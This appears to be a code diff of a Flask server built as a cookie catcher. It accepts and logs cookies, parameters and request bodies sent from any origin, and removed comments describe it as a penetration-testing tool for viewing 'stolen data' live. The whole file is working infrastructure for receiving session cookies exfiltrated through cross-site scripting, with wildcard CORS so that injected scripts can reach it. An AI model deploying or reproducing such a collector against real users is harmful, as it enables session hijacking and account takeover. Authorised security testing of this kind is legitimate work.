@@ -1,37 +1,28 @@
 from flask import Flask, request, jsonify
-from datetime import datetime, timezone   # <-- Added timezone import
+from datetime import datetime, timezone
 import json
 import os
 
-# FIX: Added instance_path to prevent crash on Python 3.14
 app = Flask(__name__, instance_path='/tmp/instance')
 
 @app.route('/', methods=['GET', 'POST', 'OPTIONS'])
 def receive_cookie():
-    """
-    Receives and logs cookies and data sent via GET or POST.
-    This is your private VAPT cookie catcher.
-    """
-    # Extract data from different parts of the request
     cookies = request.cookies
     get_params = request.args.to_dict()
     
-    # Handle JSON payload or standard form data
     if request.is_json:
         post_data = request.get_json(silent=True)
     else:
         post_data = request.form.to_dict()
 
-    # If nothing was sent, check if raw data was posted
     if not post_data and request.data:
         try:
             post_data = json.loads(request.data)
         except:
             post_data = {"raw_data": request.data.decode('utf-8', errors='ignore')}
 
-    # Build a structured log entry
     log_entry = {
-        "timestamp": datetime.now(timezone.UTC).isoformat(),   # <-- FIXED: correct syntax
+        "timestamp": datetime.now(timezone.utc).isoformat(),  # <-- Fixed: lowercase 'utc'
         "cookies": cookies,
         "get_params": get_params,
         "post_data": post_data,
@@ -40,7 +31,6 @@ def receive_cookie():
         "user_agent": request.headers.get('User-Agent')
     }
 
-    # Print to Render's live logs so you can see the stolen data in real-time
     print("=" * 70)
     print(f"📩 DATA RECEIVED at {log_entry['timestamp']}")
     print(f"🌐 From IP: {request.remote_addr}")
@@ -60,7 +50,6 @@ def receive_cookie():
     
     print("=" * 70)
 
-    # Return a simple success response
     return jsonify({
         "status": "success",
         "message": "Cookie received successfully!",
@@ -71,7 +60,6 @@ def receive_cookie():
         }
     }), 200
 
-# Enable Cross-Origin Resource Sharing (CORS) so you can test from any browser
 @app.after_request
 def after_request(response):
     response.headers.add('Access-Control-Allow-Origin', '*')
@@ -80,6 +68,5 @@ def after_request(response):
     return response
 
 if __name__ == '__main__':
-    # Get the port from the environment variable, default to 5000 if not set
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
